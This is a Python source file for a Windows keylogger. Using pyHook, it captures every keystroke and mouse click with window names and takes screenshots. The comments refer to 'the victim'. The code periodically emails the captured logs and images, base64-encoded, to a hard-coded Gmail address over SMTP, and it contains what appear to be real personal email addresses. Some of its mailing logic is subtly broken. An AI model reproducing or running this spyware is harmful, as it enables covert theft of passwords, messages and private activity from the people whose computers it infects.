import sys
import os
import win32api,pythoncom,winerror
import pyHook,os,time,random,smtplib,string,base64
import datetime
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
#from _winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval,msg,ts,FROM,message

t="";pics_names=[]


#Note: You have to edit this part from sending the keylogger to the victim

#########Settings########

yourgmail="bollayeshwanthreddy321@gmail.com"                               #What is your gmail?
yourgmailpass="*************"                                              #What is your gmail password
sendto="bollalavanya7@gmail.com"                                           #Where should I send the logs to? (any email address)
interval=120
                                                                           #Time to wait before sending data to email (in seconds)

########################

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()



def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global ts,t,FROM,message
            if len(t)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                yourgmail=("bollayeshwanthreddy321@gmail.com")#Specify Username Here 
                yourgmailpass=("************")#Specify Password Here
                FROM = yourgmail#From address is taken from username
                sendto = ["bollalavanya7@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = t
                message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(sendto), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(yourgmail,yourgmailpass)
                    server.sendmail(FROM, sendto, message)
                    t=' '
                    server.quit()
                except Exception as e:
                    print (e)
            self.event.wait(120)

def Mail_it(data, pics_names):
    data = base64.b64encode(data)
    data = 'New data from victim(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(open(pic, 'r+').read())
        data = ('New pic data from victim(Base64 encoded)\n' + data)
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(FROM, sendto, message)
        server.close()


def OnMouseEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

mail=TimerClass()
mail.start()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
